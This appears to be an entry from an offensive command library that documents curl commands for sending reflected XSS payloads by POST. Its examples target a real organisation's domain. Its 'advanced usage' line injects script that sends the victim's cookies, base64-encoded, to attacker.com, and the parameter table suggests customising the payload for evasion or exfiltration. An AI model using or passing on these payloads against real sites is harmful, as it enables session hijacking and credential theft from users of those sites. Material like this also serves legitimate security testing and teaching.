---
id: cmd-uuid-001
data: >-
  curl -X POST -d "param=<script>alert('XSS')</script>"
  https://research.ibm.com/endpoint
tags:
  - xss
  - web
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-12-15T00:00:00Z'
updated_at: '2025-12-13T23:52:39.440Z'
verified: false
validated: true
submitted: true
---
# curl-send-xss-post

## Command

```bash
curl -X POST -d "param=<script>alert('XSS')</script>" https://research.ibm.com/endpoint
```

## Description

This command sends a POST request with a reflected XSS payload to a vulnerable web endpoint, exploiting insufficient sanitization to inject JavaScript. Use it to test or demonstrate XSS on POST-based inputs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-d` | Data to send in the POST body (format: key=value) | Yes |
| `param` | Vulnerable parameter name (replace with actual) | Yes |
| `<script>alert('XSS')</script>` | XSS payload (customize for evasion or exfil) | Yes |
| URL | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "search=<script>alert('XSS')</script>" https://research.ibm.com/endpoint
```

### Advanced Usage

```bash
curl -X POST -d "input=<script>fetch('http://attacker.com?cookie='+btoa(document.cookie))</script>" -H "Content-Type: application/x-www-form-urlencoded" https://research.ibm.com/endpoint -v
```

## Expected Output

The server responds with HTML containing the reflected payload, e.g., a page with `<script>alert('XSS')</script>` embedded. In a browser context, this triggers JavaScript execution like an alert popup. Verbose mode (-v) shows full request/response for verification.

## Related

- [[Related Procedure: Exploit Reflected XSS via POST Request]]
